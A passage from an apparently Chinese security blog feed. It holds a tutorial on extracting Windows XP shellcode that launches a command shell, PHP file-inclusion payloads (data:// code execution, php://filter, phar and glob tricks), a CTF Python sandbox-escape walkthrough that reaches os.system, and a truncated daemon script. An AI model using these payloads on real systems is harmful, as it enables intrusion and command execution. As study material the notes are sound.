有了上面的工作，提取ShellCode就只剩下体力活了。我们对刚才的全汇编的程序，按F10进入调试，接着按下Debug工具栏的Disassembly按钮，点右键，在弹出菜单中选中Code Bytes，就出现汇编对应的机器码。因为汇编可以完全完成我们的功能，所以我们把汇编对应的机器码原封不动抄下来，就得到我们想要的ShellCode了。 提取出来的ShellCode如下。 1234567891011unsigned char shellcode[] ="\x55\x8B\xEC\x33\xC0\x50\x50\x50""\xC6\x45\xF4\x6D\xC6\x45\xF5\x73\xC6\x45\xF6\x76\xC6\x45\xF7\x63""\xC6\x45\xF8\x72\xC6\x45\xF9\x74\xC6\x45\xFA\x2E\xC6\x45\xFB\x64\xC6\x45\xFC\x6C""\xC6\x45\xFD\x6C\x8D\x45\xF4\x50\xBA""\x7B\x1D\x80\x7C""\xFF\xD2\x55\x8B\xEC\x33\xFF\x57\x57\x57""\xC6\x45\xF4\x63\xC6\x45\xF5\x6F\xC6\x45\xF6\x6D\xC6\x45\xF7\x6D""\xC6\x45\xF8\x61\xC6\x45\xF9\x6E\xC6\x45\xFA\x64\xC6\x45\xFB\x2E""\xC6\x45\xFC\x63\xC6\x45\xFD\x6F\xC6\x45\xFE\x6D\x8D\x45\xF4\x50\xB8""\xC7\x93\xC2\x77""\xFF\xD0"; 最后要验证提取出来的ShellCode能否完成我们的功能。在以前的文章中已经说过方法，只需要新建一个工程和c源文件，然后把ShellCode部分拷下来，存为一个数组，最后在main中添上( (void(*)(void)) &amp;shellcode )()，如下： 1234567891011121314151617unsigned char shellcode[] ="\x55\x8B\xEC\x33\xC0\x50\x50\x50""\xC6\x45\xF4\x6D\xC6\x45\xF5\x73\xC6\x45\xF6\x76\xC6\x45\xF7\x63""\xC6\x45\xF8\x72\xC6\x45\xF9\x74\xC6\x45\xFA\x2E\xC6\x45\xFB\x64\xC6\x45\xFC\x6C""\xC6\x45\xFD\x6C\x8D\x45\xF4\x50\xBA""\x7B\x1D\x80\x7C""\xFF\xD2\x55\x8B\xEC\x33\xFF\x57\x57\x57""\xC6\x45\xF4\x63\xC6\x45\xF5\x6F\xC6\x45\xF6\x6D\xC6\x45\xF7\x6D""\xC6\x45\xF8\x61\xC6\x45\xF9\x6E\xC6\x45\xFA\x64\xC6\x45\xFB\x2E""\xC6\x45\xFC\x63\xC6\x45\xFD\x6F\xC6\x45\xFE\x6D\x8D\x45\xF4\x50\xB8""\xC7\x93\xC2\x77""\xFF\xD0";int main()&#123; ( (void(*)(void)) &amp;shellcode )(); return 0;&#125; ( (void(*)(void)) &amp;shellcode )()这句话是关键，它把ShellCode转换成一个参数为空，返回为空的函数指针，并调用它。执行那句就相当于执行ShellCode数组里的那些数 据。如果ShellCode正确，就会完成我们想要的功能，出现一个DOS窗口。我们亲自编写的第一个ShellCode成功完成！]]></content>
      <categories>
        <category>overflow</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>overflow</tag>
        <tag>xp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP文件包含以及部分封装协议]]></title>
    <url>%2F2016%2F10%2F31%2Fphp-RFI-LFI-protocol%2F</url>
    <content type="text"><![CDATA[概述最近总是遇到有关文件包含的问题，所以觉得有必要学习整理下有关这方面的内容。php支持的协议可以查阅官方手册。 123456789101112file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 这里顺便记一下有关php文件包含的函数： 12345678fopen()file_get_contents()curl_exec()readfile()require()require_once()include()include_once() PHP部分封装协议file 协议文件系统 是 PHP 使用的默认封装协议，展现了本地文件系统。 当指定了一个相对路径（不以/、\、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。 在很多情况下是脚本所在的目录，除非被修改了。 使用 CLI 的时候，目录默认是脚本被调用时所在的目录。 在某些函数里，例如 fopen() 和 file_get_contents()， include_path 会可选地搜索，也作为相对的路径。 123456789&lt;?php $gfile = $_GET['gfile'];if (isset($gfile))&#123; print_r(file_get_contents($gfile));&#125;else &#123; print_r("Please input gfile !&lt;br /&gt;");&#125;// ?gfile=file://C:\mySoft\xampp\htdocs\phpinfo.php// ?gfile=file://C:/mySoft/xampp/htdocs/phpinfo.php http、https 协议允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源(需要allow_url_fopen=On并且 allow_url_include=On)。 HTTP请求会附带一个Host:头，用于兼容基于域名的虚拟主机。如果在你的 php.ini 文件中或字节流上下文（context）配置了user_agent字符串，它也会被包含在请求之中。数据流允许读取资源的 body，而 headers 则储存在了 $http_response_header 变量里。如果需要知道文档资源来自哪个 URL（经过所有重定向的处理后）， 需要处理数据流返回的系列响应报头（response headers）。 example: 12345678&lt;?php$gfile = $_GET['gfile'];if (isset($gfile))&#123; readfile($gfile);&#125;else &#123; print_r("Please input gfile !&lt;br /&gt;");&#125;// ?gfile=http://www.example.com php 协议filterphp://filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用（需要allow_url_include=On）。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。php://filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。 php://filter 参数 resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。 read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 example: 1234567891011&lt;?php$gfile = $_GET['gfile'];if (isset($gfile))&#123; readfile($gfile);&#125;else &#123; print_r("Please input gfile !&lt;br /&gt;");&#125;// ?gfile=php://filter/read=string.toupper/resource=http://www.example.com// ?gfile=php://filter/read=string.toupper|string.rot13/resource=http://www.example.com// ?gfile=php://filter/read=convert.base64-encode/resource/resource=http://www.example.com inputphp://input 是个可以访问请求的原始数据的只读流（需要allow_url_include=On）。POST 请求的情况下，最好使用 php://input 来代替 $HTTP_RAW_POST_DATA，因为它不依赖于特定的 php.ini 指令。而且，这样的情况下 $HTTP_RAW_POST_DATA 默认没有填充，比激活 always_populate_raw_post_data 潜在需要更少的内存。 enctype=”multipart/form-data”的时候 php://input 是无效的。 example: 123&lt;?php$content = file_get_contents("php://input");echo $content; //输出name=tom&amp;age=22 zlibzlib: PHP 4.0.4 - PHP 4.2.3（仅支持带 fopencookie 的系统）compress.zlib:// 和 compress.bzip2:// PHP 4.3.0 及以上 用法： compress.zlib://file.gz compress.bzip2://file.bz2 zip://archive.zip#dir/file.txt data自 PHP 5.2.0 起 data:（» RFC 2397）数据流封装器开始有效(需要allow_url_include=On)。 example :12345678910111213&lt;?php$gfile = $_GET['gfile'];if (isset($gfile))&#123; echo include($gfile);&#125;else &#123; print_r("Please input gfile !&lt;br /&gt;");&#125;// ?gfile=data://text/plain;base64,SSBsb3ZlIFBIUAo=// ?gfile=data://text/plain;charset=unicode,(●'◡'●)// ?gfile=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==// ?gfile=data://text/plain,&lt;?php phpinfo(); ?&gt; globglob:// — 查找匹配的文件路径模式。glob: 数据流包装器自 PHP 5.3.0 起开始有效，可绕过绕过open_basedir读写文件。 example : 12345678910111213&lt;?php$gfile = $_GET['gfile'];if (isset($gfile))&#123; $it = new DirectoryIterator($gfile); foreach($it as $f) &#123; printf("%s: %.1FK&lt;br /&gt;", $f-&gt;getFilename(), $f-&gt;getSize()/1024); &#125;&#125;else &#123; print_r("Please input gfile !&lt;br /&gt;");&#125;// ?gfile=glob://C:\mySoft\xampp\htdocs\*.php// ?gfile=glob://C:/mySoft/xampp/htdocs/*.php pharphar:// 数据流包装器自 PHP 5.3.0 起开始有效。PHP 归档。 123456789&lt;?php$gfile = $_GET['gfile'];if (isset($gfile))&#123; include($gfile);&#125;else &#123; print_r("Please input gfile !&lt;br /&gt;");&#125;// 把php代码写入phpinfo文件，然后压缩成zip，再改后缀为.jpg// ?gfile=phar://phpinfo.jpg/phpinfo 大概就先这样把，下次有问题再添加。]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>protocol</tag>
        <tag>php</tag>
        <tag>RFI</tag>
        <tag>LFI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python Sandbox Excape]]></title>
    <url>%2F2016%2F10%2F27%2Fpython-sandbox-excape%2F</url>
    <content type="text"><![CDATA[概述最近刚刚学习了Python Sandbox Excape，赶紧记录一下。 背景这是某个大牛的python沙盒逃逸实验的代码： 12345678910111213141516171819202122232425262728293031323334353637383940# -*- coding: utf-8 -*-# !/usr/bin/env pythonfrom __future__ import print_functionprint("Welcome to my Python sandbox! Enter commands below!")banned = [ "import", "exec", "eval", "pickle", "os", "subprocess", "kevin sucks", "input", "banned", "cry sum more", "sys"]targets = __builtins__.__dict__.keys()targets.remove('raw_input')targets.remove('print')for x in targets: # 去除所有内置函数除print raw_input del __builtins__.__dict__[x]while 1: print("&gt;&gt;&gt;", end=' ') data = raw_input() for no in banned: if no.lower() in data.lower(): print("No bueno") break else: # this means nobreak try: exec data except: print ("error !") 不能出现banned列表中的字符，但是需要读取flag文件内容。 方法file方法123456789&gt;&gt;&gt; [].__class__&lt;type 'list'&gt;&gt;&gt;&gt; &#123;&#125;.__class__&lt;type 'dict'&gt;&gt;&gt;&gt; ().__class__&lt;type 'tuple'&gt;&gt;&gt;&gt; &#123;&#125;.__class__.__base__&lt;type 'object'&gt; 发现__subclasses__()里有file： 12&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[&lt;type 'type'&gt;, &lt;type 'weakref'&gt;, &lt;type 'weakcallableproxy'&gt;, &lt;type 'weakproxy'&gt;, &lt;type 'int'&gt;, &lt;type 'basestring'&gt;, &lt;type 'bytearray'&gt;, &lt;type 'list'&gt;, &lt;type 'NoneType'&gt;, &lt;type 'NotImplementedType'&gt;, &lt;type 'traceback'&gt;, &lt;type 'super'&gt;, &lt;type 'xrange'&gt;, &lt;type 'dict'&gt;, &lt;type 'set'&gt;, &lt;type 'slice'&gt;, &lt;type 'staticmethod'&gt;, &lt;type 'complex'&gt;, &lt;type 'float'&gt;, &lt;type 'buffer'&gt;, &lt;type 'long'&gt;, &lt;type 'frozenset'&gt;, &lt;type 'property'&gt;, &lt;type 'memoryview'&gt;, &lt;type 'tuple'&gt;, &lt;type 'enumerate'&gt;, &lt;type 'reversed'&gt;, &lt;type 'code'&gt;, &lt;type 'frame'&gt;, &lt;type 'builtin_function_or_method'&gt;, &lt;type 'instancemethod'&gt;, &lt;type 'function'&gt;, &lt;type 'classobj'&gt;, &lt;type 'dictproxy'&gt;, &lt;type 'generator'&gt;, &lt;type 'getset_descriptor'&gt;, &lt;type 'wrapper_descriptor'&gt;, &lt;type 'instance'&gt;, &lt;type 'ellipsis'&gt;, &lt;type 'member_descriptor'&gt;, &lt;type 'file'&gt;, &lt;type 'PyCapsule'&gt;, &lt;type 'cell'&gt;, &lt;type 'callable-iterator'&gt;, &lt;type 'iterator'&gt;, &lt;type 'sys.long_info'&gt;, &lt;type 'sys.float_info'&gt;, &lt;type 'EncodingMap'&gt;, &lt;type 'fieldnameiterator'&gt;, &lt;type 'formatteriterator'&gt;, &lt;type 'sys.version_info'&gt;, &lt;type 'sys.flags'&gt;, &lt;type 'sys.getwindowsversion'&gt;, &lt;type 'exceptions.BaseException'&gt;, &lt;type 'module'&gt;, &lt;type 'imp.NullImporter'&gt;, &lt;type 'zipimport.zipimporter'&gt;, &lt;type 'nt.stat_result'&gt;, &lt;type 'nt.statvfs_result'&gt;, &lt;class 'warnings.WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class '_weakrefset._IterationGuard'&gt;, &lt;class '_weakrefset.WeakSet'&gt;, &lt;class '_abcoll.Hashable'&gt;, &lt;type 'classmethod'&gt;, &lt;class '_abcoll.Iterable'&gt;, &lt;class '_abcoll.Sized'&gt;, &lt;class '_abcoll.Container'&gt;, &lt;class '_abcoll.Callable'&gt;, &lt;class 'site._Printer'&gt;, &lt;class 'site._Helper'&gt;, &lt;type '_sre.SRE_Pattern'&gt;, &lt;type '_sre.SRE_Match'&gt;, &lt;type '_sre.SRE_Scanner'&gt;, &lt;class 'site.Quitter'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;type 'operator.itemgetter'&gt;, &lt;type 'operator.attrgetter'&gt;, &lt;type 'operator.methodcaller'&gt;, &lt;type 'functools.partial'&gt;, &lt;type 'MultibyteCodec'&gt;, &lt;type 'MultibyteIncrementalEncoder'&gt;, &lt;type 'MultibyteIncrementalDecoder'&gt;, &lt;type 'MultibyteStreamReader'&gt;, &lt;type 'MultibyteStreamWriter'&gt;] 12345678910111213&gt;&gt;&gt; ().__class__.__base__.__subclasses__().index(file)40&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[40]&lt;type 'file'&gt;&gt;&gt;&gt; f=().__class__.__base__.__subclasses__()[40]&gt;&gt;&gt; f('test.txt','r').read()'this is a test!'&gt;&gt;&gt; print (f('test.txt','r').read())this is a test! os模块system同样的还有一种方法就是使用os模块来执行系统命令system，但是os被屏蔽,先找到os 12345678910111213141516&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[60]&lt;class 'warnings.catch_warnings'&gt;&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[60].__init__.func_globals.keys()['filterwarnings', 'once_registry', 'WarningMessage', '_show_warning', 'filters', '_setoption', 'showwarning', '__all__', 'onceregistry', '__package__', 'simplefilter', 'default_action', '_getcategory', '__builtins__', 'catch_warnings', '__file__', 'warnpy3k', 'sys', '__name__', 'warn_explicit', 'types', 'warn', '_processoptions', 'defaultaction', '__doc__', 'linecache', '_OptionError', 'resetwarnings', 'formatwarning', '_getaction']&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[60].__init__.func_globals.keys().index('linecache')25&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[60].__init__.func_globals.keys()[25]'linecache'&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.keys()['updatecache', 'clearcache', '__all__', '__builtins__', '__file__', 'cache', 'checkcache', 'getline', '__package__', 'sys', 'getlines', '__name__', 'os', '__doc__']&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12]&lt;module 'os' from 'C:\mySoft\python2.7.9\lib\os.pyc'&gt; 然后找system 12345678910111213141516171819&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12].__dict__.keys().index('system')79&gt;&gt;&gt; a=[].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12]&gt;&gt;&gt; a&lt;module 'os' from 'C:\mySoft\python2.7.9\lib\os.pyc'&gt;&gt;&gt;&gt; s=a.__dict__.keys()&gt;&gt;&gt; s['lseek', 'O_SEQUENTIAL', 'pathsep', 'execle', '_Environ', 'kill', 'urandom', 'execlp', 'startfile', 'umask', 'linesep', 'getpid', 'spawnve', 'devnull', 'fstat', 'getenv', 'O_CREAT', 'dup2', 'read', '__file__', 'P_OVERLAY', 'O_RDONLY', 'TMP_MAX', 'utime', 'execl', 'F_OK', '_make_stat_result', 'name', 'fsync', 'remove', 'P_NOWAITO', '_copy_reg', 'execv', 'execlpe', 'pardir', 'tempnam', 'tmpfile', 'sep', 'popen4', 'defpath', 'popen2', 'stat', 'O_APPEND', 'altsep', 'close', '_exists', '__all__', 'makedirs', 'getcwdu', 'access', 'UserDict', 'O_RDWR', 'P_WAIT', 'stat_result', 'lstat', '__builtins__', 'O_TEMPORARY', 'walk', 'getcwd', 'stat_float_times', '__name__', 'O_TRUNC', 'O_TEXT', 'SEEK_END', 'popen', 'times', 'P_NOWAIT', 'removedirs', '_pickle_statvfs_result', '_exit', '_get_exports_list', 'chmod', 'SEEK_CUR', 'path', 'open', 'putenv', 'fdopen', 'errno', 'mkdir', 'system', '_execvpe', 'rmdir', 'O_WRONLY', 'dup', 'O_NOINHERIT', '__doc__', 'curdir', 'isatty', 'execvpe', 'closerange', 'execvp', 'popen3', 'X_OK', 'O_SHORT_LIVED', 'execve', 'chdir', 'strerror', 'R_OK', 'error', 'extsep', 'rename', 'P_DETACH', 'W_OK', 'abort', 'statvfs_result', 'spawnl', 'tmpnam', '__package__', 'write', 'waitpid', 'spawnv', 'listdir', '_pickle_stat_result', 'unsetenv', 'SEEK_SET', 'spawnle', 'sys', 'O_RANDOM', 'unlink', 'O_BINARY', '_make_statvfs_result', 'O_EXCL', 'pipe', 'environ', 'renames']&gt;&gt;&gt; s=a.__dict__.keys().index('system')&gt;&gt;&gt; s79&gt;&gt;&gt; s=a.__dict__.keys()[79]&gt;&gt;&gt; s'system' 读取文件 123456789101112131415&gt;&gt;&gt; s=a.__dict__.values()[79]&gt;&gt;&gt; s&lt;built-in function system&gt;&gt;&gt;&gt; s('dir') 驱动器 C 中的卷是 WIN 7 卷的序列号是 28DD-3D6F C:\Users\Administrator\Desktop 的目录2016/10/24 周一 上午 10:19 &lt;DIR&gt; .2016/10/24 周一 上午 10:19 &lt;DIR&gt; ..2016/10/24 周一 上午 10:19 15 test.txt&gt;&gt;&gt; s('type test.txt')this is a test!0 或者像下面一样： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&gt;&gt;&gt; print (().__class__)&lt;type 'tuple'&gt;&gt;&gt;&gt; print (().__class__.__base__)&lt;type 'object'&gt;&gt;&gt;&gt; print (().__class__.__base__.__subclasses__)&lt;built-in method __subclasses__ of type object at 0x1E229708&gt;&gt;&gt;&gt; print (().__class__.__base__.__subclasses__())[&lt;type 'type'&gt;, &lt;type 'weakref'&gt;, &lt;type 'weakcallableproxy'&gt;, &lt;type 'weakproxy'&gt;, &lt;type 'int'&gt;, &lt;type 'basestring'&gt;, &lt;type 'bytearray'&gt;, &lt;type 'list'&gt;, &lt;type 'NoneType'&gt;, &lt;type 'NotImplementedType'&gt;, &lt;type 'traceback'&gt;, &lt;type 'super'&gt;, &lt;type 'xrange'&gt;, &lt;type 'dict'&gt;, &lt;type 'set'&gt;, &lt;type 'slice'&gt;, &lt;type 'staticmethod'&gt;, &lt;type 'complex'&gt;, &lt;type 'float'&gt;, &lt;type 'buffer'&gt;, &lt;type 'long'&gt;, &lt;type 'frozenset'&gt;, &lt;type 'property'&gt;, &lt;type 'memoryview'&gt;, &lt;type 'tuple'&gt;, &lt;type 'enumerate'&gt;, &lt;type 'reversed'&gt;, &lt;type 'code'&gt;, &lt;type 'frame'&gt;, &lt;type 'builtin_function_or_method'&gt;, &lt;type 'instancemethod'&gt;, &lt;type 'function'&gt;, &lt;type 'classobj'&gt;, &lt;type 'dictproxy'&gt;, &lt;type 'generator'&gt;, &lt;type 'getset_descriptor'&gt;, &lt;type 'wrapper_descriptor'&gt;, &lt;type 'instance'&gt;, &lt;type 'ellipsis'&gt;, &lt;type 'member_descriptor'&gt;, &lt;type 'file'&gt;, &lt;type 'PyCapsule'&gt;, &lt;type 'cell'&gt;, &lt;type 'callable-iterator'&gt;, &lt;type 'iterator'&gt;, &lt;type 'sys.long_info'&gt;, &lt;type 'sys.float_info'&gt;, &lt;type 'EncodingMap'&gt;, &lt;type 'fieldnameiterator'&gt;, &lt;type 'formatteriterator'&gt;, &lt;type 'sys.version_info'&gt;, &lt;type 'sys.flags'&gt;, &lt;type 'sys.getwindowsversion'&gt;, &lt;type 'exceptions.BaseException'&gt;, &lt;type 'module'&gt;, &lt;type 'imp.NullImporter'&gt;, &lt;type 'zipimport.zipimporter'&gt;, &lt;type 'nt.stat_result'&gt;, &lt;type 'nt.statvfs_result'&gt;, &lt;class 'warnings.WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class '_weakrefset._IterationGuard'&gt;, &lt;class '_weakrefset.WeakSet'&gt;, &lt;class '_abcoll.Hashable'&gt;, &lt;type 'classmethod'&gt;, &lt;class '_abcoll.Iterable'&gt;, &lt;class '_abcoll.Sized'&gt;, &lt;class '_abcoll.Container'&gt;, &lt;class '_abcoll.Callable'&gt;, &lt;class 'site._Printer'&gt;, &lt;class 'site._Helper'&gt;, &lt;type '_sre.SRE_Pattern'&gt;, &lt;type '_sre.SRE_Match'&gt;, &lt;type '_sre.SRE_Scanner'&gt;, &lt;class 'site.Quitter'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;type 'operator.itemgetter'&gt;, &lt;type 'operator.attrgetter'&gt;, &lt;type 'operator.methodcaller'&gt;, &lt;type 'functools.partial'&gt;, &lt;type 'MultibyteCodec'&gt;, &lt;type 'MultibyteIncrementalEncoder'&gt;, &lt;type 'MultibyteIncrementalDecoder'&gt;, &lt;type 'MultibyteStreamReader'&gt;, &lt;type 'MultibyteStreamWriter'&gt;]&gt;&gt;&gt; print (().__class__.__base__.__subclasses__()[60])&lt;class 'warnings.catch_warnings'&gt;&gt;&gt;&gt; print (().__class__.__base__.__subclasses__()[60].__init__.func_globals.keys())['filterwarnings', 'once_registry', 'WarningMessage', '_show_warning', 'filters', '_setoption', 'showwarning', '__all__', 'onceregistry', '__package__', 'simplefilter', 'default_action', '_getcategory', '__builtins__', 'catch_warnings', '__file__', 'warnpy3k', 'sys', '__name__', 'warn_explicit', 'types', 'warn', '_processoptions', 'defaultaction', '__doc__', 'linecache', '_OptionError', 'resetwarnings', 'formatwarning', '_getaction']&gt;&gt;&gt; print (().__class__.__base__.__subclasses__()[60].__init__.func_globals.keys()[25])linecache&gt;&gt;&gt; print ([].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'])&lt;module 'linecache' from 'C:\mySoft\python2.7.9\lib\linecache.pyc'&gt;&gt;&gt;&gt; print ([].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.keys())['updatecache', 'clearcache', '__all__', '__builtins__', '__file__', 'cache', 'checkcache', 'getline', '__package__', 'sys', 'getlines', '__name__', 'os', '__doc__']&gt;&gt;&gt; print ([].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.keys()[12])os&gt;&gt;&gt; print ([].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12])&lt;module 'os' from 'C:\mySoft\python2.7.9\lib\os.pyc'&gt;&gt;&gt;&gt; print ([].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12].__dict__.keys())['lseek', 'O_SEQUENTIAL', 'pathsep', 'execle', '_Environ', 'kill', 'urandom', 'execlp', 'startfile', 'umask', 'linesep', 'getpid', 'spawnve', 'devnull', 'fstat', 'getenv', 'O_CREAT', 'dup2', 'read', '__file__', 'P_OVERLAY', 'O_RDONLY', 'TMP_MAX', 'utime', 'execl', 'F_OK', '_make_stat_result', 'name', 'fsync', 'remove', 'P_NOWAITO', '_copy_reg', 'execv', 'execlpe', 'pardir', 'tempnam', 'tmpfile', 'sep', 'popen4', 'defpath', 'popen2', 'stat', 'O_APPEND', 'altsep', 'close', '_exists', '__all__', 'makedirs', 'getcwdu', 'access', 'UserDict', 'O_RDWR', 'P_WAIT', 'stat_result', 'lstat', '__builtins__', 'O_TEMPORARY', 'walk', 'getcwd', 'stat_float_times', '__name__', 'O_TRUNC', 'O_TEXT', 'SEEK_END', 'popen', 'times', 'P_NOWAIT', 'removedirs', '_pickle_statvfs_result', '_exit', '_get_exports_list', 'chmod', 'SEEK_CUR', 'path', 'open', 'putenv', 'fdopen', 'errno', 'mkdir', 'system', '_execvpe', 'rmdir', 'O_WRONLY', 'dup', 'O_NOINHERIT', '__doc__', 'curdir', 'isatty', 'execvpe', 'closerange', 'execvp', 'popen3', 'X_OK', 'O_SHORT_LIVED', 'execve', 'chdir', 'strerror', 'R_OK', 'error', 'extsep', 'rename', 'P_DETACH', 'W_OK', 'abort', 'statvfs_result', 'spawnl', 'tmpnam', '__package__', 'write', 'waitpid', 'spawnv', 'listdir', '_pickle_stat_result', 'unsetenv', 'SEEK_SET', 'spawnle', 'sys', 'O_RANDOM', 'unlink', 'O_BINARY', '_make_statvfs_result', 'O_EXCL', 'pipe', 'environ', 'renames']&gt;&gt;&gt; print ([].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12].__dict__.keys()[79])system&gt;&gt;&gt; print ([].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12].__dict__.values()[79]('type test.txt'))this is a test!0 当然，还有很多方式]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>code execution</tag>
        <tag>excape</tag>
        <tag>sandbox</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python 版的守护进程和Windows服务]]></title>
    <url>%2F2016%2F10%2F22%2Fpython-linux-daemon-windows-service%2F</url>
    <content type="text"><![CDATA[概述最近在写python脚本时需要用到Linux的守护进程以及Windows下的服务进程。百度了挺多，都记下来，以后如果再次遇到这种问题就不用去找了。 Linux守护进程最重要的特性是后台运行；它必须与其运行前的环境隔离开来，这些环境包括未关闭的文件描述符、控制终端、会话和进程组、工作目录以及文件创建掩码等；它可以在系统启动时从启动脚本/etc/rc.d中启动，可以由inetd守护进程启动，也可以有作业规划进程crond启动，还可以由用户终端（通常是shell）执行。Python有时需要保证只运行一个脚本实例，以避免数据的冲突。详细参考大神文章 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155#!/usr/bin/env python# -*- coding: utf-8 -*-''' 增加守护进程（linux）'''import osimport datetimeimport timeimport sysimport atexitimport string import subprocessfrom signal import SIGTERM from lib.function import confdealclass Daemon: #需要获取调试信息，改为stdin='/dev/stdin', stdout='/dev/stdout', stderr='/dev/stderr'，以root身份运行。 def __init__(self, scriptPath,pidfile, stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'): self.stdin = stdin self.stdout = stdout self.stderr = stderr self.pidfile = pidfile self.scriptPath = scriptPath def _daemonize(self): try: pid = os.fork() #第一次fork，生成子进程，脱离父进程 if pid &gt; 0: sys.exit(0) #退出主进程 except OSError, e: sys.stderr.write('fork #1 failed: %d (%s)\n' % (e.errno, e.strerror)) sys.exit(1) os.chdir("/") #修改工作目录 os.setsid() #设置新的会话连接 os.umask(0) #重新设置文件创建权限 try: pid = os.fork() #第二次fork，禁止进程打开终端 if pid &gt; 0: sys.exit(0) except OSError, e: sys.stderr.write('fork #2 failed: %d (%s)\n' % (e.errno, e.strerror)) sys.exit(1) #重定向文件描述符 sys.stdout.flush() sys.stderr.flush() si = file(self.stdin, 'r') so = file(self.stdout, 'a+') se = file(self.stderr, 'a+', 0) os.dup2(si.fileno(), sys.stdin.fileno()) os.dup2(so.fileno(), sys.stdout.fileno()) os.dup2(se.fileno(), sys.stderr.fileno()) #注册退出函数，根据文件pid判断是否存在进程 atexit.register(self.delpid) pid = str(os.getpid()) file(self.pidfile,'w+').write('%s\n' % pid) def delpid(self): os.remove(self.pidfile) def start(self): #检查pid文件是否存在以探测是否存在进程 try: pf = file(self.pidfile,'r') pid = int(pf.read().strip()) pf.close() except IOError: pid = None if pid: message = 'pidfile %s already exist. Daemon already running!\n' sys.stderr.write(message % self.pidfile) sys.exit(1) #启动监控 self._daemonize() self._run() def stop(self): #从pid文件中获取pid try: pf = file(self.pidfile,'r') pid = int(pf.read().strip()) pf.close() except IOError: pid = None if not pid: #重启不报错 message = 'pidfile %s does not exist. Daemon not running!\n' sys.stderr.write(message % self.pidfile) return #杀进程 # 我的程序需要，只是获取端口号 remoteDic = confdeal.getConfRemote(self.scriptPath) if remoteDic: # 根据端口号杀掉子进程 ret = os.popen('netstat -antup | grep \":'+str(remoteDic['localPort'])+' \"') strList = list(set(ret.read().split('\n'))) for pidStr in strList: if pidStr != '': pidStr = pidStr.split('/')[0] pidStr = pidStr[pidStr.rfind(' ')+1:] os.system("kill "+pidStr) try: while 1: os.kill(pid, SIGTERM) time.sleep(0.1) #os.system('hadoop-daemon.sh stop datanode') #os.system('hadoop-daemon.sh stop tasktracker') #os.remove(self.pidfile) except OSError, err: err = str(err) if err.find('No such process') &gt; 0: if os.path.exists(self.pidfile): os.remove(self.pidfile) else: print str(err) sys.exit(1) def restart(self): self.stop() self.start() def _run(self): # 开启子进程 cmd = 'cd ' + self.scriptPath +' &amp;&amp; python test.py' child = subprocess.Popen(cmd, shell=True) while 1: if child.poll()==1: child = subprocess.Popen(cmd, shell=True) time.sleep(10)if __name__ == '__main__': scriptPath = os.path.dirname(os.path.realpath(__file__)) daemon = Daemon(scriptPath,'/tmp/watch_process.pid', stdout = '/tmp/watch_stdout.log') if len(sys.argv) == 2: if 'start' == sys.argv[1]: daemon.start() elif 'stop' == sys.argv[1]: daemon.stop() elif 'restart' == sys.argv[1]: daemon.restart() else: print 'unknown command' sys.exit(2) sys.exit(0) else: print 'usage: %s start|stop|restart' % sys.argv[0] sys.exit(2) WindowsPython程序作为Windows服务启动，需要安装pywin32包。详细参考大神文章 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#!/usr/bin/env python# -*- coding: utf-8 -*-''' 增加windows服务'''import pythoncomimport win32serviceutilimport win32serviceimport win32eventimport servicemanagerimport socketimport osimport sysimport subprocessimport timefrom lib.function import confdealclass Daemon 